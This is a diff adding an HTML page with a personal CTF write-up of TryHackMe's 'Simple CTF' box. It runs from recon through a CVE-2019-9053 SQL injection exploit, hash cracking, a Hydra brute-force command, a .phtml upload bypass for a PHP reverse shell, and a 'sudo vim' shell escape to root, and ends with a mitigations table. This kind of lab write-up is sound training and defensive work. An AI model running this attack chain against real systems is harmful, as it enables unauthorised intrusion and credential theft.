@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Simple CTF — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Anonymous FTP exposed a note revealing username mitch. A CMS Made Simple 2.2.8 installation on the web server was vulnerable to CVE-2019-9053…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/simplectf.html">
+<meta property="og:title" content="Simple CTF — TryHackMe writeup">
+<meta property="og:description" content="Anonymous FTP exposed a note revealing username mitch. A CMS Made Simple 2.2.8 installation on the web server was vulnerable to CVE-2019-9053…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/simplectf.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Simple CTF — TryHackMe writeup","description":"Anonymous FTP exposed a note revealing username mitch. A CMS Made Simple 2.2.8 installation on the web server was vulnerable to CVE-2019-9053…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-06","url":"https://thecyberfarhan.github.io/writeups/simplectf.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/simplectf.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Simple CTF</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 6, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Anonymous FTP exposed a note revealing username <code>mitch</code>. A CMS Made Simple 2.2.8 installation on the web server was vulnerable to CVE-2019-9053 (unauthenticated SQL injection), leaking a salted MD5 hash that cracked to <code>secret</code>. Password reuse got us into the CMS admin panel; a file upload extension filter bypass (<code>.phtml</code> instead of <code>.php</code>) gave a <code>www-data</code> shell. SSH with the cracked credentials landed a proper user shell. <code>sudo vim</code> with no password requirement escalated directly to root in one command. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">📂 FTP client</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐉 Hydra</span><span class="chip">🐍 Python 2 exploit (EDB-46635)</span><span class="chip">🔓 Hashcat</span><span class="chip">🐚 Netcat</span><span class="chip">🔑 SSH</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Simple CTF</strong> — a box that tells you exactly how complicated things are going to get right there in the name. Three services, one username left in a plaintext note on an anonymous FTP server, a CMS running a publicly known SQL injection vulnerability, and a <code>sudo</code> rule so generous it might as well be a signed permission slip to root. The only thing standing between <code>www-data</code> and a proper shell was a file upload filter that had apparently never heard of <code>.phtml</code>. Simple indeed.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>FTP client basics and what anonymous login means</li><li>What a CMS (Content Management System) is</li><li>Basic understanding of SQL injection and hash cracking concepts</li><li>How reverse shells work and how to catch them with Netcat</li><li>What <code>sudo -l</code> reveals and why unrestricted <code>sudo</code> on an editor is dangerous</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p>Three ports this time — more interesting than the usual two.</p>
+<p class="aside">Full-range sweep, Nmap handling service and version detection:</p>
+<pre><code>rustscan -a 10.49.168.253 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.3 — <strong>anonymous login allowed</strong></td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr><tr><td>2222/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu</td></tr></tbody></table>
+<p>Two things stand out immediately. First, Nmap flags anonymous FTP login as allowed — that's a free credential bypass that demands immediate attention. Second, SSH is running on port 2222 rather than the standard 22, which is a common "security by obscurity" measure that obscures nothing from a full port scan.</p>
+<p>Nmap also picks up something valuable from <code>robots.txt</code> on port 80:</p>
+<pre><code>http-robots.txt: 2 disallowed entries
+/  /openemr-5_0_1_3</code></pre>
+<p>The <code>robots.txt</code> is trying to hide a specific path — a medical records software installation. *This turned out to be a distraction; the actual target CMS was at <code>/simple/</code> discovered during directory enumeration.*</p>
+<h3>Anonymous FTP</h3>
+<p>The anonymous FTP flag from Nmap is too good to ignore. FTP passive mode timed out immediately, requiring a manual switch before directory listing would respond.</p>
+<p class="aside">Connecting to FTP, switching to active mode to resolve passive mode timeout:</p>
+<pre><code>ftp 10.49.168.253</code></pre>
+
+<pre><code>Name: anonymous
+230 Login successful.
+ftp&gt; passive
+Passive mode: off; fallback to active mode: off.
+ftp&gt; ls
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+ftp&gt; cd pub
+ftp&gt; ls
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt    # ^^^ jackpot</code></pre>
+<p class="aside">Downloading the note:</p>
+<pre><code>ftp&gt; get ForMitch.txt</code></pre>
+
+<pre><code># ForMitch.txt contents
+Dammit man... you're the worst dev I've seen. You set the same pass for
+the system user, and the password is so weak... I cracked it in seconds.
+Gosh... what a mess!</code></pre>
+<p>Username: <code>mitch</code>. Password: unknown but weak enough to crack in seconds — rockyou.txt territory. Also critically: the note says the *system* user password is the same as whatever other account this refers to — meaning one cracked password likely opens multiple doors.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~8 mins into the box)</p>
+<p class="aside">Feroxbuster with PHP, TXT, and HTML extensions:</p>
+<pre><code>feroxbuster -u http://10.49.168.253/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+200  http://10.49.168.253/robots.txt
+301  http://10.49.168.253/simple              # ^^^ CMS installation
+200  http://10.49.168.253/simple/index.php
+302  http://10.49.168.253/simple/admin/index.php  =&gt;  login.php
+200  http://10.49.168.253/simple/admin/login.php</code></pre>
+<p>The <code>/simple/</code> directory hosts a full CMS Made Simple installation. The footer of the site reveals the version: <strong>CMS Made Simple 2.2.8</strong>.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~15 mins into the box)</p>
+<h3>CVE-2019-9053 — CMS Made Simple SQL Injection</h3>
+<p><strong>What is this vulnerability?</strong> CMS Made Simple versions prior to 2.2.10 contain an unauthenticated time-based blind SQL injection in the News module via the <code>m1_idlist</code> parameter. An attacker can exploit this to enumerate the database without any credentials, extracting usernames, email addresses, password hashes, and salts directly from the CMS database.</p>
+<p>The exploit is available on Exploit-DB as EDB-46635. It's a Python 2 script, which required a small amount of dependency wrestling before it would run cleanly — <code>termcolor</code> needed to be grabbed manually since the pip2 ecosystem has largely collapsed.</p>
+<p class="aside">Setting up the Python 2 dependency:</p>
+<pre><code>curl -s https://raw.githubusercontent.com/termcolor/termcolor/1.1.0/termcolor.py \
+  -o termcolor.py</code></pre>
+<p class="aside">Running the SQL injection exploit against the target:</p>
+<pre><code>python2 46635.py -u http://10.49.168.253/simple</code></pre>
+
+<pre><code># output
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96</code></pre>
+<p>The hash format is <code>md5($salt.$pass)</code> — a salted MD5, Hashcat mode 20.</p>
+<h3>Hash Cracking — Hashcat</h3>
+<p class="aside">Preparing the hash in the format Hashcat expects (<code>hash:salt</code>):</p>
+<pre><code>echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" &gt; target_hash.txt</code></pre>
+<p class="aside">Cracking with rockyou.txt, mode 20 (md5($salt.$pass)):</p>
+<pre><code>hashcat -m 20 -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code># output
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+
+Status: Cracked
+Hash.Mode: 20 (md5($salt.$pass))
+Time.Started: Sat Jun  6 18:31:51 2026 (0 secs)   # ^^^ instant</code></pre>
+<p>Password: <code>secret</code>. The note from the FTP server was not exaggerating.</p>
+<h3>Credentials Summary</h3>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>mitch</code></td><td><code>secret</code></td><td>SQLi extraction → Hashcat crack</td></tr></tbody></table>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~25 mins into the box)</p>
+<h3>CMS Admin Login — Confirming Password Reuse</h3>
+<p>With credentials in hand, logging into the CMS admin panel at <code>/simple/admin/login.php</code> confirmed <code>mitch:secret</code> works. The CMS is running as a relatively low-privilege web user, so the admin panel itself isn't the end goal — it's a means to upload a reverse shell.</p>
+<p class="aside">Hydra was also used to independently confirm the credentials via brute force:</p>
+<pre><code>hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.49.168.253 \
+  http-post-form \
+  "/simple/admin/login.php:username=^USER^&amp;password=^PASS^&amp;loginsubmit=Submit:User name or password incorrect"</code></pre>
+
+<pre><code># output
+[80][http-post-form] host: 10.49.168.253   login: mitch   password: secret
+1 of 1 target successfully completed</code></pre>
+<h3>File Upload — Extension Filter Bypass</h3>
+<p>The CMS admin panel includes a file manager with upload functionality. Uploading a standard <code>.php</code> reverse shell (PentestMonkey's <code>php-reverse-shell.php</code>) was blocked — the application maintains an allowlist of safe extensions and rejects anything not on it.</p>
+<p><strong>What is a file extension filter bypass?</strong> Web applications often try to prevent malicious file uploads by checking the file extension. Allowlist approaches are more robust (permit only <code>.jpg</code>, <code>.png</code>, etc.) but this CMS's filter failed to account for alternative PHP execution extensions that Apache will still process as PHP code. <code>.phtml</code> is one such extension — it's treated as PHP by the server but not blocked by the filter.</p>
+<p class="aside">Renaming the reverse shell to evade the filter:</p>
+<pre><code>cp php-reverse-shell.php php-reverse-shell.phtml</code></pre>
+<p>The <code>.php.jpg</code> double-extension trick was attempted first and failed — the server correctly identified it as non-image. <code>.phtml</code> uploaded cleanly and executed.</p>
+<p class="aside">Setting up the listener before triggering the shell:</p>
+<pre><code>nc -nlvp 4444</code></pre>
+<p class="aside">Navigating to the uploaded file via the CMS uploads directory to trigger execution.</p>
+<pre><code># reverse shell callback
+connect to [192.168.133.233] from (UNKNOWN) [10.49.168.253] 50196
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p class="aside">Stabilising the shell:</p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p>We're in as <code>www-data</code>. The home directories for <code>mitch</code> and <code>sunbath</code> are both permission-denied from this account — but we already have the SSH password.</p>
+<h3>SSH — Proper User Shell</h3>
+<p>The note said the system user password matches. Port 2222, credentials <code>mitch:secret</code>:</p>
+<pre><code>ssh mitch@10.49.168.253 -p 2222</code></pre>
+
+<pre><code># output
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+$ whoami
+mitch
+$ cat user.txt
+G00d j0b, keep up!</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~35 mins into the box)</p>
+<h3>sudo vim — GTFOBins Classic</h3>
+<p>The first thing to check after landing a user shell: what can this user run as root?</p>
+<p class="aside">Checking sudo permissions:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim</code></pre>
+<p><strong>Why is this dangerous?</strong> <code>vim</code> is a text editor — but it's also a fully-featured scripting environment that can execute arbitrary shell commands. GTFOBins documents dozens of editors, interpreters, and utilities that can be abused to escape to a shell when granted <code>sudo</code> access. The <code>:!</code> command in <code>vim</code> runs a shell command directly. When <code>vim</code> is running as root (via <code>sudo</code>), that shell command runs as root too.</p>
+<p class="aside">One command to root:</p>
+<pre><code>sudo vim -c ':!/bin/sh'</code></pre>
+
+<pre><code># output — root shell
+# whoami
+root
+# cat /root/root.txt
+W3ll d0n3. You made it!</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The full attack chain, end to end:</p>
+<ol><li><strong>Anonymous FTP</strong> exposed <code>ForMitch.txt</code> → learned username <code>mitch</code> and that his password is reused and weak</li><li><strong>CVE-2019-9053</strong> (CMS Made Simple SQLi) → extracted salted MD5 hash from the database</li><li><strong>Hashcat</strong> cracked <code>md5($salt.$pass)</code> → plaintext password <code>secret</code></li><li><strong><code>.phtml</code> upload bypass</strong> → reverse shell as <code>www-data</code></li><li><strong>SSH with cracked credentials</strong> → proper user shell as <code>mitch</code></li><li><strong><code>sudo vim</code> GTFOBins escape</strong> → root shell in one command</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>openemr-5_0_1_3 in robots.txt</h3>
+<p>Nmap flagged a disallowed entry in <code>robots.txt</code> pointing to an OpenEMR installation path. OpenEMR is medical records software with its own public CVEs. *This appeared to be a decoy path — the directory did not return a valid response and no actual OpenEMR installation was present.* Following it up cost a few minutes of investigation.</p>
+<h3><code>.php.jpg</code> Double Extension</h3>
+<p>The first upload bypass attempt used a double extension (<code>php-reverse-shell.php.jpg</code>), which is a common trick against naive filters that only check the last extension. The server's upload handler checked the full filename and identified it as non-image. Dropping back to <code>.phtml</code> as a single extension resolved it immediately.</p>
+<h3>Python 2 / pip2 Dependency Hell</h3>
+<p>The EDB-46635 exploit is Python 2 only and imports <code>termcolor</code>. Attempting to install <code>termcolor</code> via <code>pip2</code> failed due to Python 2's end-of-life package ecosystem breaking <code>setuptools</code>. The fix was fetching the <code>termcolor.py</code> module source file directly from GitHub and dropping it in the same directory as the exploit — no package manager involved.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Anonymous FTP with sensitive data</td><td class="sev-high">High</td><td>Disable anonymous FTP; never store credential hints or usernames on publicly accessible services</td></tr><tr><td>CMS Made Simple 2.2.8 (CVE-2019-9053)</td><td class="sev-critical">Critical</td><td>Update to CMS Made Simple 2.2.10+; keep CMS software patched</td></tr><tr><td>Weak password (<code>secret</code>)</td><td class="sev-critical">Critical</td><td>Enforce a minimum password complexity policy; use a password manager</td></tr><tr><td>Password reuse across CMS and system account</td><td class="sev-high">High</td><td>Use unique passwords for every service and account</td></tr><tr><td>File upload filter — extension allowlist incomplete</td><td class="sev-high">High</td><td>Explicitly allowlist only safe, non-executable extensions; deny everything else; additionally validate file content (magic bytes), not just the name</td></tr><tr><td><code>sudo vim</code> with <code>NOPASSWD</code></td><td class="sev-critical">Critical</td><td>Never grant <code>sudo</code> access to editors, interpreters, or scripting tools; if vim access is needed, restrict it to specific files with <code>sudoedit</code></td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Granting <code>sudo</code> access to any program that can run arbitrary commands — editors, interpreters, pagers, file transfer tools — is functionally equivalent to granting unrestricted root access. Always check GTFOBins before adding anything to a <code>sudoers</code> file.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Skip the CVE-2019-9053 exploit entirely and go straight from Hydra (which cracked the password in under ten seconds) to the CMS file upload — the SQL injection path was interesting but the Hydra result was faster and got to the same place. The exploit is worth knowing, but not worth the Python 2 dependency yak-shaving in a timed scenario.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/simplectf_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
